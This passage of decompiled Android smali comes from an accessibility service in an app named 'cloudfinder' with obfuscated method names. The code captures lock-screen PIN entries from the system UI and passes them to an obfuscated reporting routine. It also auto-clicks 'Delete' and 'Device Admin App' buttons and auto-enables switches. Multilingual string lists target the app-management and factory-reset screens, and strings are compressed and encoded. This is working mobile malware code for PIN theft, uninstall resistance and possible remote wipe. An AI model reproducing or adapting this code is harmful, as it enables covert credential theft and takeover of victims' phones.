    const-string v23, "\u0412\u0441\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f"

    const-string v24, "Kelola aplikasi"

    const-string v25, "Semua aplikasi"

    const-string v26, "Qu\u1ea3n l\u00fd \u1ee9ng d\u1ee5ng"

    const-string v27, "T\u1ea5t c\u1ea3 \u1ee9ng d\u1ee5ng"

    const-string v28, "\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23\u0e41\u0e2d\u0e1b\u0e1e\u0e25\u0e34\u0e40\u0e04\u0e0a\u0e31\u0e19"

    const-string v29, "\u0e41\u0e2d\u0e1b\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14"

    const-string v30, "Urus aplikasi"

    const-string v31, "Semua aplikasi"

    const-string v32, "\u0625\u062f\u0627\u0631\u0629 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a"

    const-string v33, "\u062c\u0645\u064a\u0639 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a"

    const-string v34, "\u090f\u092a\u094d\u0932\u093f\u0915\u0947\u0936\u0928 \u092a\u094d\u0930\u092c\u0902\u0927\u093f\u0924 \u0915\u0930\u0947\u0902"

    const-string v35, "\u0938\u092d\u0940 \u0910\u092a\u094d\u0938"

    const-string v36, "\uc571 \uad00\ub9ac"

    const-string v37, "\ubaa8\ub4e0 \uc571"

    const-string v38, "\u30a2\u30d7\u30ea\u7ba1\u7406"

    const-string v39, "\u3059\u3079\u3066\u306e\u30a2\u30d7\u30ea"

    const-string v40, "Uygulamalar\u0131 y\u00f6net"

    const-string v41, "T\u00fcm uygulamalar"

    const-string v42, "Pamahalaan ang mga app"

    const-string v43, "\u09b8\u09ae\u09b8\u09cd\u09a4 \u0985\u09cd\u09af\u09be\u09aa"

    const-string v44, "\u062a\u0645\u0627\u0645 \u0627\u06cc\u067e\u0633"

    filled-new-array/range {v1 .. v44}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك:[Ljava/lang/String;

    const-string v1, "Factory data reset"

    const-string v2, "Erase all data"

    const-string v3, "Reset phone"

    const-string v4, "Reset device"

    const-string v5, "\u6062\u590d\u51fa\u5382\u8bbe\u7f6e"

    const-string v6, "\u6e05\u9664\u6240\u6709\u6570\u636e"

    const-string v7, "\u91cd\u7f6e\u624b\u673a"

    const-string v8, "Restablecimiento de f\u00e1brica"

    const-string v9, "Borrar todos los datos"

    const-string v10, "Restaurar dados de f\u00e1brica"

    const-string v11, "Apagar todos os dados"

    const-string v12, "R\u00e9initialisation des donn\u00e9es d\'usine"

    const-string v13, "Effacer toutes les donn\u00e9es"

    const-string v14, "Auf Werkszustand zur\u00fccksetzen"

    const-string v15, "Alle Daten l\u00f6schen"

    const-string v16, "Ripristino dati di fabbrica"

    const-string v17, "Cancella tutti i dati"

    const-string v18, "\u0421\u0431\u0440\u043e\u0441 \u0434\u043e \u0437\u0430\u0432\u043e\u0434\u0441\u043a\u0438\u0445 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043a"

    const-string v19, "\u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0432\u0441\u0435 \u0434\u0430\u043d\u043d\u044b\u0435"

    const-string v20, "Setelan pabrik"

    const-string v21, "Hapus semua data"

    const-string v22, "Kh\u00f4i ph\u1ee5c c\u00e0i \u0111\u1eb7t g\u1ed1c"

    const-string v23, "X\u00f3a t\u1ea5t c\u1ea3 d\u1eef li\u1ec7u"

    const-string v24, "\u0e23\u0e35\u0e40\u0e0b\u0e47\u0e15\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e40\u0e1b\u0e47\u0e19\u0e04\u0e48\u0e32\u0e40\u0e23\u0e34\u0e48\u0e21\u0e15\u0e49\u0e19"

    const-string v25, "\u0e25\u0e1a\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14"

    const-string v26, "Tetapan semula kilang"

    const-string v27, "Padam semua data"

    const-string v28, "\u0625\u0639\u0627\u062f\u0629 \u0636\u0628\u0637 \u0627\u0644\u0645\u0635\u0646\u0639"

    const-string v29, "\u0645\u0633\u062d \u062c\u0645\u064a\u0639 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a"

    const-string v30, "\u092b\u093c\u0948\u0915\u094d\u091f\u094d\u0930\u0940 \u0921\u0947\u091f\u093e \u0930\u0940\u0938\u0947\u091f"

    const-string v31, "\u0938\u092d\u0940 \u0921\u0947\u091f\u093e \u092e\u093f\u091f\u093e\u090f\u0902"

    const-string v32, "\uacf5\uc7a5 \ucd08\uae30\ud654"

    const-string v33, "\ubaa8\ub4e0 \ub370\uc774\ud130 \uc0ad\uc81c"

    const-string v34, "\u30c7\u30fc\u30bf\u306e\u521d\u671f\u5316"

    const-string v35, "\u3059\u3079\u3066\u306e\u30c7\u30fc\u30bf\u3092\u6d88\u53bb"

    const-string v36, "Fabrika ayarlar\u0131na s\u0131f\u0131rla"

    const-string v37, "T\u00fcm verileri sil"

    filled-new-array/range {v1 .. v37}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ل:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 10

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ:J

    const-string v2, ""

    iput-object v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ء:Ljava/lang/String;

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->آ:J

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ:J

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؤ:J

    iput-wide v0, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->إ:J

    new-instance v3, Ljava/util/concurrent/ThreadPoolExecutor;

    const/4 v4, 0x4

    const/16 v5, 0x8

    const-wide/16 v6, 0xf

    sget-object v8, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    new-instance v9, Ljava/util/concurrent/LinkedBlockingQueue;

    invoke-direct {v9}, Ljava/util/concurrent/LinkedBlockingQueue;-><init>()V

    invoke-direct/range {v3 .. v9}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

    return-void
.end method

.method public static ج(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 6

    const/4 v0, 0x0

    if-nez p0, :cond_0

    return v0

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    :cond_1
    const-string v2, ""

    :goto_0
    const-string v3, "android.widget.Button"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v2

    const/4 v3, 0x1

    if-eqz v2, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_3

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_3

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const-string v5, "Delete"

    invoke-virtual {v5, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_2

    const-string v5, "huawei"

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_2

    const-string v5, "liantong"

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_2

    const-string v5, "delete"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_2

    const-string v5, "Device Admin App"

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2

    const-string v2, "device admin app"

    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    :cond_2
    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v3

    :cond_3
    move v2, v0

    :goto_1
    if-ge v2, v1, :cond_6

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_4

    goto :goto_2

    :cond_4
    :try_start_0
    invoke-static {v4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ج(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v5
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v5, :cond_5

    :try_start_1
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    return v3

    :cond_5
    :try_start_2
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :catchall_0
    move-exception p0

    :try_start_3
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    throw p0

    :cond_6
    return v0
.end method

.method public static خ(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    :try_start_0
    const-string v0, "UTF-8"

    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p0

    new-instance v0, Ljava/util/zip/Deflater;

    const/4 v1, 0x1

    invoke-direct {v0, v1, v1}, Ljava/util/zip/Deflater;-><init>(IZ)V

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v2, Ljava/util/zip/DeflaterOutputStream;

    invoke-direct {v2, v1, v0}, Ljava/util/zip/DeflaterOutputStream;-><init>(Ljava/io/OutputStream;Ljava/util/zip/Deflater;)V

    invoke-virtual {v2, p0}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/util/zip/DeflaterOutputStream;->close()V

    invoke-static {}, Ljava/util/Base64;->getEncoder()Ljava/util/Base64$Encoder;

    move-result-object p0

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/util/Base64$Encoder;->encodeToString([B)Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    const-string v0, "MyAccessSvc"

    const-string v1, "deflateBase64 error"

    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    const-string p0, ""

    return-object p0
.end method

.method public static د(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    const-string v0, "&"

    const-string v1, "&amp;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const-string v0, "\""

    const-string v1, "&quot;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const-string v0, "<"

    const-string v1, "&lt;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const-string v0, ">"

    const-string v1, "&gt;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_1
    :goto_0
    const-string p0, ""

    return-object p0
.end method

.method public static ذ(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 4

    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_2

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    goto :goto_1

    :cond_0
    :try_start_0
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_1

    const-string v3, "android.widget.RadioButton"

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v2

    if-nez v2, :cond_1

    const/16 p0, 0x10

    invoke-virtual {v1, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    return-void

    :cond_1
    :try_start_2
    invoke-static {v1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catchall_0
    move-exception p0

    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    throw p0

    :cond_2
    return-void
.end method

.method public static ر(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 4

    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_2

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    goto :goto_1

    :cond_0
    :try_start_0
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_1

    const-string v3, "android.widget.Switch"

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v2

    if-nez v2, :cond_1

    const/16 p0, 0x10

    invoke-virtual {v1, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    return-void

    :cond_1
    :try_start_2
    invoke-static {v1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ر(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catchall_0
    move-exception p0

    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    throw p0

    :cond_2
    return-void
.end method

.method public static ز(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 3

    const/4 v0, 0x0

    if-nez p0, :cond_0

    return-object v0

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_1
    const-string v1, ""

    :goto_0
    const-string v2, "EditText"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    return-object p0

    :cond_2
    const/4 v1, 0x0

    :goto_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-ge v1, v2, :cond_4

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_3

    return-object v2

    :cond_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_4
    return-object v0
.end method

.method public static س(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/util/ArrayList;
    .locals 3

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {v0, p0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const/4 v1, 0x0

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-ge v1, v2, :cond_1

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->س(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/util/ArrayList;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->addAll(Ljava/util/Collection;)Z

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    return-object v0
.end method

.method public static ش()V
    .locals 9

    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ض:Z

    if-eqz v0, :cond_1

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ش:Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v1

    if-nez v1, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ص:Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "PIN_FLUSH text="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " points="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "MyAccessSvc"

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "lockpin_"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {}, Lسۄھؤۏ۫/؋;->ذ()Ljava/lang/String;

    move-result-object v3

    const-string v4, "com.android.systemui"

    const-string v5, "android.view.ViewGroup"

    const-string v6, "pwd"

    invoke-static/range {v2 .. v8}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->setLength(I)V

    sput-boolean v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ض:Z

    :cond_1
    :goto_0
    return-void
.end method

.method public static ص()Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    .locals 1

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    return-object v0
.end method

.method public static ض(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, ";\n nodeInfo: {"

    invoke-virtual {p0, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v1, -0x1

    if-ne v0, v1, :cond_0

    const-string v0, ";"

    invoke-virtual {p0, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    :cond_0
    const/4 v2, 0x0

    if-eq v0, v1, :cond_1

    invoke-virtual {p0, v2, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p0

    :cond_1
    const-string v0, "}"

    invoke-virtual {p0, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-virtual {p0, v2, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p0

    :cond_2
    return-object p0
.end method

.method public static ػ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    const-string v0, "ime:"

    :try_start_0
    invoke-static {p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "android.widget.LinearLayout"

    invoke-virtual {v1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_1

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_1

    const-string p2, "com.android.systemui:id/action_bar_title"

    invoke-virtual {p0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_1

    if-eqz p3, :cond_1

    invoke-virtual {p3}, Ljava/lang/String;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_1

    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    if-nez p1, :cond_0

    const-string p1, ""

    goto :goto_0

    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    const/4 p2, 0x2

    invoke-static {p1, p2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1

    :goto_0
    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_1

    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void
.end method

.method public static ؼ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    const-string p3, "com.android.systemui:id/back"

    invoke-static {p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    if-nez p0, :cond_1

    return-void

    :cond_1
    :try_start_0
    const-string p1, "android.widget.ImageView"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_2

    return-void

    :cond_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_6

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result p1

    if-eqz p1, :cond_3

    goto :goto_1

    :cond_3
    invoke-virtual {p0, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string p2, "com.android.systemui:id/recent_apps"

    if-nez p1, :cond_4

    :try_start_1
    invoke-virtual {p0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_4

    const-string p1, "com.android.systemui:id/key"

    invoke-virtual {p0, p1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_6

    :cond_4
    invoke-virtual {p0, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_5

    goto :goto_0

    :cond_5
    invoke-virtual {p0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    :goto_0
    sget-object p0, Lcom/lite/cloudfinder/App;->آ:Landroid/os/Handler;

    if-eqz p0, :cond_6

    new-instance p1, Lةؽڗںۍټ٘/؋;

    const/4 p2, 0x7

    invoke-direct {p1, p2}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    invoke-virtual {p0, p1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_6
    :goto_1
    return-void
.end method

.method public static ف(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 6

    const-string v0, "com.android.settings:id/app_name"

    const-string v1, "com.android.settings:id/app_detail_title"

    const-string v2, "com.android.settings:id/entity_header_title"

    const-string v3, "android:id/title"

    const-string v4, "com.android.packageinstaller:id/app_name"

    const-string v5, "com.miui.packageinstaller:id/app_name"

    filled-new-array/range {v0 .. v5}, [Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    const/4 v3, 0x6

    const/4 v4, 0x1

    if-ge v2, v3, :cond_2

    aget-object v3, v0, v2

    :try_start_0
